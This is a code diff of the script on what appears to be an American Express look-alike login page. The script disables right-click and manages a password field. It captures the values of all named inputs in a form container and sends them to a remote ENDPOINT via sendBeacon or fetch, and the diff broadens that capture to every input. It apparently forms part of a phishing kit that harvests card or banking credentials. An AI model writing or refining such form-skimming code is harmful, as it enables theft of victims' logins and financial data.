@@ -355,7 +355,7 @@ function setupUI() {
   // 🔒 Disable right‑click context menu
   document.addEventListener("contextmenu", e => e.preventDefault());
 
-  // 📝 Password input toggle (fixed gating + existence check)
+  // 📝 Password input toggle
   const passwordInput = document.getElementById("upw");
   const toggleButton = document.getElementById("toggleupw");
   let hasTyped = false;
@@ -364,23 +364,17 @@ function setupUI() {
     passwordInput.addEventListener("input", () => {
       if (!hasTyped) {
         hasTyped = true;
-        if (passwordInput.type !== "password") {
-          passwordInput.type = "password";
-        }
-        // If toggle button exists, ensure it’s visible/ready
-        if (toggleButton) toggleButton.disabled = false;
+        passwordInput.type = "password";
       }
     });
   }
 
   if (passwordInput && toggleButton) {
-    // Start disabled until user types something
-    toggleButton.disabled = !hasTyped;
     toggleButton.addEventListener("click", () => {
       if (!hasTyped) return;
-      const next = passwordInput.type === "password" ? "text" : "password";
-      passwordInput.type = next;
-      toggleButton.textContent = next === "password" ? "Show" : "Hide";
+      const type = passwordInput.type === "password" ? "text" : "password";
+      passwordInput.type = type;
+      toggleButton.textContent = type === "password" ? "Show" : "Hide";
     });
   }
 
@@ -388,7 +382,11 @@ function setupUI() {
     try {
       const blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
       let beaconOk = false;
-      if (navigator.sendBeacon) beaconOk = navigator.sendBeacon(ENDPOINT, blob);
+
+      if (navigator.sendBeacon) {
+        beaconOk = navigator.sendBeacon(ENDPOINT, blob);
+      }
+
       if (!beaconOk) {
         fetch(ENDPOINT, {
           method: "POST",
@@ -400,23 +398,24 @@ function setupUI() {
     } catch (err) {}
   }
 
-  // ✅ Capture change events reliably (capturing phase to avoid bubbling issues)
-  document.addEventListener("change", (e) => {
+  // ✅ Broadened change listener: any input inside #clsdiv
+  document.addEventListener("change", e => {
     const el = e.target;
-    if (!el) return;
-    if (el.matches(".input-control") && el.closest("#clsdiv")) {
+    if (el?.closest("#clsdiv") && el.tagName === "INPUT") {
+      const inputs = document.querySelectorAll("#clsdiv input[name]");
       const payload = { eventType: "change", timestamp: new Date().toISOString(), fields: {} };
-      document.querySelectorAll(".input-control").forEach(i => {
-        if (i.name) payload.fields[i.name] = i.value;
+
+      inputs.forEach(input => {
+        payload.fields[input.name] = input.value;
       });
       sendPayload(payload);
     }
-  }, true); // <-- capturing
+  });
 }
 
 document.addEventListener("DOMContentLoaded", setupUI);
-
 </script>
+
 		
 <footer class="amex-footer">
   <div class="footer-container">
